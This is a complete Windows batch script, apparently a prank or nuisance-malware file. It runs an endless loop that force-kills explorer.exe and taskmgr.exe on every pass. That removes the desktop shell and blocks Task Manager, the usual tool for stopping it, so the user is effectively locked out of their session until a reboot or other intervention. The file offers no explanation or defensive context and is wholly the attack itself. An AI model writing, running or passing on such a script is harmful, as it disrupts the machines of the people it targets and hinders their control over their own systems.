@echo off
:A
taskkill /F /IM explorer.exe
taskkill /F /IM taskmgr.exe
goto A